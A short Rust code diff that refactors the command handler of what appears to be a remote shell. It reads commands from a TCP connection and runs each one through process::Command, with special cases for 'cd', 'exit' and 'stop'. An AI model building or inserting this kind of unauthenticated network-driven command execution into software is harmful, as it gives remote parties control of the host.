@@ -13,18 +13,20 @@ async fn read_command(conn: &mut TcpStream) -> String {
 }
 
 fn execute_send_command(args: Vec<&str>) -> Result<String, String> {
-    if args[0].trim() == "exit" { return Err("exit".into()) }
-    if args[0].trim() == "stop" { process::exit(0); }
-
-    if args[0].trim() == "cd" {
-        if args.len() != 2 {
-            return Err("missing path".into())
-        }
-        match set_current_dir(args[1]) {
-            Ok(_) => return Ok("changed dir with success".into()),
-            Err(_) => return Err("error when changing dir".into())
-        };
-    }
+    match args[0].trim() {
+        "cd" => {
+            if args.len() != 2 {
+                return Err("missing path".into())
+            }
+            match set_current_dir(args[1]) {
+                Ok(_) => return Ok("changed dir with success".into()),
+                Err(_) => return Err("error when changing dir".into())
+            };
+        },
+        "exit" => return Err("exit".into()),
+        "stop" => process::exit(0),
+        _ => {}
+    };
 
     let Ok(output) = process::Command::new(args[0]).args(&args[1..]).output() else { return Err("command error".into()) };
     let Ok(output) = String::from_utf8(output.stdout) else { return Err("command output error".into()) };
